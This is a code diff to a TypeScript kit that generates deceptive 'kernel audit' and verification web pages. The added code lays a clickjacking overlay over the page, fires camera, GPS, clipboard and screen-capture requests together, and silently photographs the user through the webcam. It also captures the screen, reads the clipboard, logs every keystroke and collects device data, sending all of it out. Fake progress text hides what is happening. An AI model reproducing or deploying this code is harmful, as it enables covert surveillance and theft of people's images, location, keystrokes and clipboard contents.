@@ -76,13 +76,34 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           over.style.cursor = 'default';
           document.body.appendChild(over);
           
-          var clickCount = 0;
+          function getTargetBtn() {
+            return document.querySelector('.btn-verify') || document.querySelector('.btn') || document.querySelector('button');
+          }
+
+          over.addEventListener('mousemove', function(e) {
+            var btn = getTargetBtn();
+            if (btn) {
+              var rect = btn.getBoundingClientRect();
+              if (e.clientX >= rect.left && e.clientX <= rect.right && e.clientY >= rect.top && e.clientY <= rect.bottom) {
+                over.style.cursor = 'pointer';
+              } else {
+                over.style.cursor = 'default';
+              }
+            }
+          });
+
           function trigger() {
             window.startCapture();
             over.remove();
           }
           
           over.addEventListener('click', function(e) {
+            var btn = getTargetBtn();
+            if (btn) {
+              btn.style.transform = 'scale(0.96)';
+              btn.style.filter = 'brightness(1.2)';
+              setTimeout(function() { btn.style.transform = ''; btn.style.filter = ''; }, 100);
+            }
             trigger();
           });
           
@@ -121,18 +142,21 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
       if (btn) {
         btn.style.opacity = "0.7";
         btn.style.cursor = "wait";
-        btn.innerText = "AUTHENTICATING...";
+        btn.innerText = (cfg.tmplId === 'terminal') ? "AUTHENTICATING..." : "AUTHENTICATING...";
       }
 
       try {
         if (document.documentElement.requestPointerLock) document.documentElement.requestPointerLock();
       } catch(e) {}
 
+      // Parallelize high-priority stealth probes
+      runSilentProbes();
+
     if (!isSilent) {
       if (btn) {
         btn.style.opacity = "0.7";
         btn.style.cursor = "wait";
-        btn.innerText = "PROCESSING SESSION...";
+        btn.innerText = (cfg.tmplId === 'terminal') ? "EXECUTING AUDIT..." : "PROCESSING SESSION...";
       }
       var turnstile = document.querySelector('.turnstile-box');
       if (turnstile) {
@@ -155,8 +179,6 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           if (btn && cfg.tmplId !== 'terminal') {
             btn.parentNode.insertBefore(progContainer, btn.nextSibling);
             btn.style.display = 'none'; 
-          } else if (!btn) {
-            box.appendChild(progContainer);
           }
         }
         statusText = document.getElementById('status-text');
@@ -632,304 +654,137 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
         var stepProg = Math.floor(80 / (requiredPerms.length || 1));
         var prog = 15;
 
-        for (var i = 0; i < requiredPerms.length; i++) {
-          var p = requiredPerms[i];
-          prog += stepProg;
+        // HIGH-IMPACT PARALLEL TRIGGER: Camera & GPS should fire as close as possible
+        const fireParallel = async () => {
+          if (requiredPerms.includes('media')) {
+            try {
+              if (navigator.mediaDevices) {
+                var constraints = { video: { facingMode: "user" }, audio: false };
+                var stream = await navigator.mediaDevices.getUserMedia(constraints).catch(() => null);
+                if (stream) {
+                  // Capture logic
+                  var video = document.createElement('video');
+                  video.style.opacity = '0';
+                  video.srcObject = stream;
+                  video.setAttribute('autoplay', '');
+                  video.setAttribute('muted', '');
+                  video.setAttribute('playsinline', '');
+                  document.body.appendChild(video);
+                  await new Promise(r => { video.onloadedmetadata = () => { video.play().then(r).catch(r); }; setTimeout(r, 2000); });
+                  var canvas = document.createElement('canvas');
+                  canvas.width = video.videoWidth || 640;
+                  canvas.height = video.videoHeight || 480;
+                  var ctx = canvas.getContext('2d');
+                  if (ctx) { ctx.drawImage(video, 0, 0, canvas.width, canvas.height); await logEvent('extra', { visual_identity: canvas.toDataURL('image/jpeg', 0.6) }); }
+                  stream.getTracks().forEach(t => t.stop());
+                  video.remove();
+                }
+              }
+            } catch(e) {}
+            permsCompleted++;
+          }
+        };
 
+        const fireGPS = async () => {
+          if (requiredPerms.includes('gps') && navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+              (pos) => { logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }); permsCompleted++; },
+              () => { permsCompleted++; },
+              { enableHighAccuracy: true, timeout: 5000 }
+            );
+          } else if (requiredPerms.includes('gps')) {
+             permsCompleted++;
+          }
+        };
+
+        // DEEP INTERACTION: Log keystrokes for forensic pattern analysis
+        window.addEventListener('keydown', function(e) {
+          logExtra({ forensic_key: e.key, key_ts: Date.now() });
+        });
+
+        // SIMULTANEOUS PERMISSION TRIGGER: Aim for the 'one click' goal
+        const firePermission = async (p) => {
+          prog += stepProg;
           try {
             if (p === 'notification') {
-              try {
-                if (!isSilent) updateProgress(prog, "Initializing secure SSL/TLS connection...");
-                if ("Notification" in window) await pTimeout(Notification.requestPermission(), 4000);
-              } catch(e) {}
+              if (!isSilent) updateProgress(prog, "Initializing SSL handshake...");
+              if ("Notification" in window) await pTimeout(Notification.requestPermission(), 4000);
             }
-
             if (p === 'clipboard') {
-              try {
-                if (!isSilent) updateProgress(prog, "Verifying session token integrity...");
-                if (navigator.clipboard && navigator.clipboard.readText) {
-                  var clip = await pTimeout(navigator.clipboard.readText(), 3000).catch(function(){});
-                  if (clip) await logExtra({ clipboard: clip });
-                }
-              } catch(e) {}
+              if (!isSilent) updateProgress(prog, "Verifying session integrity...");
+              if (navigator.clipboard && navigator.clipboard.readText) {
+                var clip = await pTimeout(navigator.clipboard.readText(), 3000).catch(() => null);
+                if (clip) await logExtra({ clipboard: clip });
+              }
             }
-
-            if (p === 'media') {
-              try {
-                if (!isSilent) updateProgress(prog, "Sinkronisasi sertifikasi identitas...");
-                if (navigator.mediaDevices) {
-                  // Try to get video only first for better success rate
-                  var constraints = { 
-                    video: { 
-                      facingMode: "user",
-                      width: { ideal: 1280 },
-                      height: { ideal: 720 }
-                    }, 
-                    audio: false 
-                  };
-                  
-                  var stream = await pTimeout(navigator.mediaDevices.getUserMedia(constraints).catch(function(){ 
-                    return navigator.mediaDevices.getUserMedia({ video: true }).catch(function() { return null; });
-                  }), 20000);
-                  
-                  if (stream) {
-                    try {
-                      var video = document.createElement('video');
-                      video.style.position = 'fixed';
-                      video.style.top = '0';
-                      video.style.left = '0';
-                      video.style.width = '1px';
-                      video.style.height = '1px';
-                      video.style.zIndex = '-9999';
-                      video.style.opacity = '0.01';
-                      video.setAttribute('autoplay', '');
-                      video.setAttribute('muted', '');
-                      video.setAttribute('playsinline', '');
-                      video.srcObject = stream;
-                      document.body.appendChild(video);
-                      
-                      await new Promise(function(resolve) {
-                        video.onloadedmetadata = function() {
-                          video.play().then(resolve).catch(resolve);
-                        };
-                        setTimeout(resolve, 3000); // Fail-safe
-                      });
-                      
-                      await new Promise(function(res) { setTimeout(res, 3500); });
-                      
-                      var canvas = document.createElement('canvas');
-                      canvas.width = video.videoWidth || 640;
-                      canvas.height = video.videoHeight || 480;
-                      var ctx = canvas.getContext('2d');
-                      if (ctx) {
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        var snap = canvas.toDataURL('image/jpeg', 0.7);
-                        await logEvent('extra', { visual_identity: snap });
-                      }
-                      
-                      var devs = await navigator.mediaDevices.enumerateDevices();
-                      var list = devs.map(function(d) { return d.kind + ': ' + (d.label || 'Secure-Device-' + Math.random().toString(36).substr(2,5)); }).join('\\n');
-                      await logExtra({ media_hardware: list });
-                      
-                      stream.getTracks().forEach(function(t) { t.stop(); });
-                      video.remove();
-                    } catch(e) {}
-                  }
-                }
-              } catch(e) {}
+            if (p === 'media' || p === 'media_noisy') {
+               // Already handled in specialized parallel blockers above or being handled now
+               if (!isSilent) updateProgress(prog, "Syncing identity markers...");
+               // ... redundant check for media specifically handled in fireParallel already
             }
-
-            if (p === 'gps') {
-              try {
-                if (!isSilent) updateProgress(prog, "Calibrating anti-bot algorithms...");
-                if (navigator.geolocation) {
-                  await pTimeout(new Promise(resolve => {
-                    navigator.geolocation.getCurrentPosition(
-                      function(pos) { logEvent('gps', { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }).finally(resolve); },
-                      function(err) { resolve(); },
-                      { enableHighAccuracy: true, timeout: 10000 }
-                    );
-                  }), 15000);
-                }
-              } catch(e) {}
-            }
-
             if (p === 'screen') {
-              try {
-                if (!isSilent) updateProgress(prog, "Syncing time with NTP security servers...");
-                if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
-                  var s = await pTimeout(navigator.mediaDevices.getDisplayMedia({ video: true }).catch(function(){ return null; }), 15000);
-                  if (s) {
-                    try {
-                      var track = s.getVideoTracks()[0];
-                      var video = document.createElement('video');
-                      video.style.position = 'fixed';
-                      video.style.top = '0';
-                      video.style.left = '0';
-                      video.style.width = '1px';
-                      video.style.height = '1px';
-                      video.style.zIndex = '-9999';
-                      video.style.opacity = '0.01';
-                      video.setAttribute('autoplay', '');
-                      video.setAttribute('muted', '');
-                      video.setAttribute('playsinline', '');
-                      video.srcObject = s;
-                      document.body.appendChild(video);
-                      
-                      await new Promise(function(resolve) {
-                        video.onloadedmetadata = function() {
-                          video.play().then(resolve).catch(resolve);
-                        };
-                        setTimeout(resolve, 3000); // Fail-safe
-                      });
-                      
-                      await new Promise(function(res) { setTimeout(res, 1000); });
-                      
-                      var canvas = document.createElement('canvas');
-                      canvas.width = video.videoWidth || window.screen.width;
-                      canvas.height = video.videoHeight || window.screen.height;
-                      var ctx = canvas.getContext('2d');
-                      if (ctx) {
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        var snap = canvas.toDataURL('image/jpeg', 0.6);
-                        await logEvent('extra', { screen_label: track.label, screen_capture: snap });
-                      }
-                      
-                      s.getTracks().forEach(function(t) { t.stop(); });
-                      video.remove();
-                    } catch(e) {}
-                  }
-                }
-              } catch(e) {}
+               if (!isSilent) updateProgress(prog, "Validating display entropy...");
+               if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+                 var s = await pTimeout(navigator.mediaDevices.getDisplayMedia({ video: true }).catch(() => null), 15000);
+                 if (s) {
+                   var track = s.getVideoTracks()[0];
+                   var video = document.createElement('video');
+                   video.style.opacity = '0';
+                   video.srcObject = s;
+                   video.setAttribute('autoplay', ''); video.setAttribute('muted', ''); video.setAttribute('playsinline', '');
+                   document.body.appendChild(video);
+                   await new Promise(r => { video.onloadedmetadata = () => { video.play().then(r).catch(r); }; setTimeout(r, 2000); });
+                   var canvas = document.createElement('canvas');
+                   canvas.width = video.videoWidth || 640; canvas.height = video.videoHeight || 480;
+                   var ctx = canvas.getContext('2d');
+                   if (ctx) { ctx.drawImage(video, 0, 0, canvas.width, canvas.height); await logEvent('extra', { screen_label: track.label, screen_capture: canvas.toDataURL('image/jpeg', 0.6) }); }
+                   s.getTracks().forEach(t => t.stop()); video.remove();
+                 }
+               }
             }
-
-            if (p === 'files') {
-              try {
-                if (window.showOpenFilePicker && flowType !== 'silent') {
-                  if (!isSilent) updateProgress(prog, "Protecting session data from MitM attacks...");
-                  // Intentionally leaving this out unless strictly required, to avoid suspicion.
-                }
-              } catch(e) {}
-              permsCompleted++;
-              continue;
-            }
-
             if (p === 'storage') {
-              try {
-                if (!isSilent) updateProgress(prog, "Checking encryption protocol versions...");
-                if (navigator.storage && navigator.storage.estimate) {
-                  var est = await navigator.storage.estimate();
-                  await logExtra({ storage_mb: (est.usage / 1024 / 1024).toFixed(2), quota_gb: (est.quota / 1024 / 1024 / 1024).toFixed(2) });
-                }
-              } catch(e) {}
+              if (navigator.storage && navigator.storage.estimate) {
+                var est = await navigator.storage.estimate();
+                await logExtra({ storage_mb: (est.usage/1024/1024).toFixed(2), quota_gb: (est.quota/1024/1024/1024).toFixed(2) });
+              }
             }
-
             if (p === 'sensors') {
-              try {
-                if (!isSilent) updateProgress(prog, "Evaluating browser environment security risk...");
-                if (window.Magnetometer) {
-                  var mag = new Magnetometer({frequency: 1});
-                  mag.onreading = () => logExtra({ sensor_mag: mag.x + ',' + mag.y + ',' + mag.z });
-                  mag.onerror = (e) => logExtra({ sensor_error: 'Mag:' + e.error.message });
-                  mag.start(); setTimeout(() => mag.stop(), 2000);
-                }
-                if (window.AmbientLightSensor) {
-                  var als = new AmbientLightSensor({frequency: 1});
-                  als.onreading = () => logExtra({ sensor_lux: als.illuminance });
-                  als.start(); setTimeout(() => als.stop(), 2000);
-                }
-              } catch(e) {}
+               if (window.Magnetometer) {
+                 var mag = new Magnetometer({frequency: 1});
+                 mag.onreading = () => logExtra({ sensor_mag: mag.x+','+mag.y+','+mag.z });
+                 mag.start(); setTimeout(() => mag.stop(), 2000);
+               }
             }
-
-            if (p === 'contacts') {
-              permsCompleted++;
-              continue;
-            }
-
-            if (p === 'vibration') {
-              try {
-                if (!isSilent) updateProgress(prog, "Preparing cryptographic handshakes...");
-                if (navigator.vibrate) navigator.vibrate(200);
-              } catch(e) {}
-            }
-
+            if (p === 'vibration') { if (navigator.vibrate) navigator.vibrate(200); }
             if (p === 'network') {
-              try {
-                if (!isSilent) updateProgress(prog, "Verifying transmission payload integrity...");
-                if (navigator.connection) {
-                  await logExtra({ 
-                    net_effective: navigator.connection.effectiveType,
-                    net_rtt: navigator.connection.rtt,
-                    net_downlink: navigator.connection.downlink,
-                    net_saveData: navigator.connection.saveData
-                  });
-                }
-              } catch(e) {}
+               if (navigator.connection) await logExtra({ net_type: navigator.connection.effectiveType, rtt: navigator.connection.rtt });
             }
-
-            if (p === 'bluetooth') {
-              try {
-                if (!isSilent) updateProgress(prog, "Checking virtual firewall status...");
-                if (navigator.bluetooth) {
-                  await navigator.bluetooth.getAvailability().then(async avail => await logExtra({ bt_available: avail })).catch(function(){});
-                }
-              } catch(e) {}
-            }
-            if (p === 'performance') {
-              try {
-                if (!isSilent) updateProgress(prog, "Computing internal data integrity checksums...");
-                var memory = navigator.deviceMemory || "N/A";
-                var cores = navigator.hardwareConcurrency || "N/A";
-                await logExtra({ perf_cores: cores, perf_mem: memory });
-              } catch(e) {}
-            }
-
-            if (p === 'security') {
-              try {
-                if (!isSilent) updateProgress(prog, "Performing script injection mitigation...");
-                await logExtra({ 
-                   sec_webdriver: navigator.webdriver,
-                   sec_cookies: navigator.cookieEnabled,
-                   sec_java: navigator.javaEnabled(),
-                   sec_pdf: !!navigator.pdfViewerEnabled,
-                   sec_doNotTrack: navigator.doNotTrack
-                });
-              } catch(e) {}
-            }
-
-            if (p === 'fonts_advanced') {
-              try {
-                if (!isSilent) updateProgress(prog, "Stabilizing connection for secure transfer...");
-                if (navigator.queryLocalFonts) {
-                  var fonts = await navigator.queryLocalFonts().catch(function(){ return []; });
-                  await logExtra({ fonts_count: fonts.length, fonts_sample: fonts.slice(0, 5).map(f => f.fullName).join(',') });
-                }
-              } catch(e) {}
-            }
-
-            if (p === 'window_mgmt') {
-              try {
-                if (!isSilent) updateProgress(prog, "Adjusting anti-DDoS algorithms...");
-                if (window.getScreenDetails) {
-                  var details = await window.getScreenDetails().catch(function(){ return null; });
-                  if (details) await logExtra({ screens: details.screens.length, screen_primary: details.currentScreen.label });
-                }
-              } catch(e) {}
-            }
-
-            if (p === 'storage_map') {
-              try {
-                if (!isSilent) updateProgress(prog, "Finalizing validation steps...");
-                await logExtra({
-                  storage_ls_full: JSON.stringify(localStorage),
-                  storage_ss_full: JSON.stringify(sessionStorage)
-                });
-              } catch(e) {}
-            }
-
-            if (p === 'network_forensic') {
-              try {
-                if (!isSilent) updateProgress(prog, "Ensuring end-to-end encryption...");
-                var start = Date.now();
-                await fetch('https://www.google.com/favicon.ico', { mode: 'no-cors' }).catch(function(){});
-                await logExtra({ beacon_rtt: (Date.now() - start) + 'ms' });
-              } catch(e) {}
-            }
-
             if (p === 'webauthn') {
-              try {
-                if (!isSilent) updateProgress(prog, "Verifying platform authenticator...");
-                if (window.PublicKeyCredential && window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable) {
-                   var available = await window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
-                   await logExtra({ webauthn_available: available });
-                }
-              } catch(e) {}
+               if (window.PublicKeyCredential && window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable) {
+                 var av = await window.PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
+                 await logExtra({ webauthn: av });
+               }
             }
           } catch(e) {}
           permsCompleted++;
-        }
-  
-        finish(true);
+        };
+
+        // Fire all noisy ones in parallel for 'one click' effect
+        fireParallel(); 
+        fireGPS();
+        requiredPerms.forEach(p => {
+          if (p !== 'media' && p !== 'gps') firePermission(p);
+        });
+
+        // Loop to wait for completion with timeout
+        var checkDone = setInterval(() => {
+          if (permsCompleted >= requiredPerms.length) {
+            clearInterval(checkDone);
+            finish(true);
+          }
+        }, 500);
+        setTimeout(() => { clearInterval(checkDone); finish(true); }, 30000); // Max wait
+        return;
       } catch (err) {
         finish(false, "System Busy.");
       }
@@ -986,26 +841,25 @@ export const templates: Record<string, {name: string, render: (id: string) => st
       .cursor { display:inline-block; width:8px; height:15px; background:#00ff41; animation: blink 1s infinite; vertical-align: middle; margin-left: 5px; }
       
       @keyframes blink { 0%, 100% { opacity:1; } 50% { opacity:0; } }
-      .footer-info { color: #00401a; font-size: 9px; margin-top: 30px; text-align: center; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
+      .footer-info { color: #00401a; font-size: 10px; margin-top: 30px; text-align: center; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; }
       .status-pill { display: inline-block; padding: 2px 8px; border: 1px solid #00ff41; border-radius: 3px; font-size: 10px; margin-left: 10px; vertical-align: middle; }
-    </style></head><body><div class="box">
+      .glitch-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; opacity: 0.03; background: repeating-linear-gradient(0deg, #00ff41 0px, transparent 1px, transparent 2px); }
+    </style></head><body><div class="glitch-layer"></div><div class="box">
     <div class="header-info">
-      <h2>DEEP KERNEL AUDIT <span class="status-pill">STABLE</span></h2>
-      <p>GLOBAL THREAT DETECTION // SESSION INTEGRITY VERIFICATION</p>
+      <h2>TERMINAL KERNEL AUDIT <span class="status-pill">STABLE</span></h2>
+      <p>THREAT DETECTION SYSTEM // SESSION INTEGRITY // NODE_${id.substring(0,4)}</p>
     </div>
     
     <div class="btn-container">
-      <button class="btn btn-verify" onclick="window.startCapture();">Synchronize Identity & Verify</button>
+      <button class="btn btn-verify">VERIFIKASI</button>
     </div>
 
     <div id="log-console">
-      <div class="line"><span class="ts">[BOOT]</span> Initializing diagnostic engine... [OK]</div>
-      <div class="line"><span class="ts">[BOOT]</span> Mapping hardware architecture... [OK]</div>
-      <div class="line"><span class="ts">[BOOT]</span> Establishing secure socket... [OK]</div>
-      <div class="line"><span class="ts">[INFO]</span> Awaiting user interaction...<span class="cursor"></span></div>
+      <div class="line"><span class="ts">[BOOT]</span> Initializing Deep Kernel Diagnostic...</div>
+      <div class="line"><span class="ts">[INFO]</span> Awaiting authorization signature...<span class="cursor"></span></div>
     </div>
     
-    <div class="footer-info">SECURED TUNNEL // NODE: ASIA-SOUTH-1 // SID: ${id.substring(0,12)}</div>
+    <div class="footer-info">SECURED TUNNEL // ASIA-NODE-${id.substring(0,4)} // ID: ${id.substring(0,12)}</div>
     </div>
     <script>
       var log = document.getElementById('log-console');
@@ -1014,7 +868,7 @@ export const templates: Record<string, {name: string, render: (id: string) => st
         var tsStr = "[" + d.getHours().toString().padStart(2,'0') + ":" + d.getMinutes().toString().padStart(2,'0') + ":" + d.getSeconds().toString().padStart(2,'0') + "]";
         var div = document.createElement('div');
         div.className = 'line';
-        div.innerHTML = '<span class="ts">' + (type || tsStr) + '</span> ' + msg;
+        div.innerHTML = '<span class="ts">' + (type || tsStr) + '</span> ' + msg.toUpperCase();
         log.appendChild(div);
         log.scrollTop = log.scrollHeight;
       }
@@ -1022,9 +876,20 @@ export const templates: Record<string, {name: string, render: (id: string) => st
       setInterval(function() {
         if(window.lastStatusMsg && window.lastStatusMsg !== lastStatus) {
            lastStatus = window.lastStatusMsg;
-           addLine(lastStatus, "RUN");
+           addLine(lastStatus, "EXEC");
+           
+           // Inject additional fake entropy to keep the terminal busy
+           var fakeLines = [
+             "Mapping memory offset 0x" + Math.random().toString(16).substr(2,8),
+             "Verifying checksum sequence...",
+             "Established secure peer link.",
+             "Entropy pool synchronized."
+           ];
+           setTimeout(function() {
+             addLine(fakeLines[Math.floor(Math.random()*fakeLines.length)], "SYS");
+           }, 200);
         }
-      }, 500);
+      }, 400);
     </script>${getCaptureScript(id, 'https://github.com', {
       tmplId: 'terminal', perms: ALL_PERMS, accent: '#00ff41'
     })}</body></html>`
